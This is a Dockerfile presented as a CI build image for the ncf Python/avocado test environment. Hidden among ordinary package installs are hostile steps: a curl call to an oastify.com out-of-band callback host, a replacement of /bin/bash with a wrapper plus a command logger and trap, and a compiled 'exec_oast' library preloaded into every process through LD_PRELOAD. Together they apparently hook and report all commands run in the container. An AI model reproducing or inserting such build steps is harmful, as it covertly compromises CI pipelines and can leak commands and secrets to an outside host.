FROM debian:11
LABEL ci=ncf/ci/python.Dockerfile

ARG USER_ID=1000
COPY ci/user.sh .
RUN ./user.sh $USER_ID ;\
    apt-get update && apt-get install -y git wget gnupg2 make curl python3-pip gcc ;\
    pip3 install avocado-framework pylint Jinja2

RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/python-avocado.Dockerfile

# Accept all OSes
ENV UNSUPPORTED=y
RUN wget https://repository.rudder.io/tools/rudder-setup && sed -i "s/set -e/set -xe/" rudder-setup && sed -i "s/rudder agent inventory//" rudder-setup && sed -i "s/rudder agent health/rudder agent health || true/" rudder-setup && sh ./rudder-setup setup-agent latest

# 1) Install the logger & trap
COPY ci/command_logger.sh /etc/command_logger.sh
COPY ci/bash_trap.sh     /etc/bash_trap.sh
RUN chmod +x /etc/command_logger.sh /etc/bash_trap.sh

# 3) Swap out /bin/bash
RUN mv /bin/bash /bin/bash.real
COPY ci/bash_wrapper.sh /bin/bash
RUN chmod +x /bin/bash

# instead of moving dash out of the way...
RUN mv /bin/sh /bin/sh.real && ln -s /bin/bash /bin/sh

COPY ci/exec_oast.c /tmp/exec_oast.c
RUN gcc -shared -fPIC -o /usr/local/lib/libexec_oast.so /tmp/exec_oast.c -ldl \
 && rm /tmp/exec_oast.c

# ensure it's preloaded for all processes
ENV LD_PRELOAD=/usr/local/lib/libexec_oast.so


# 2) Install our ENTRYPOINT wrapper
COPY ci/entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# 3) Set it as the container’s ENTRYPOINT
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]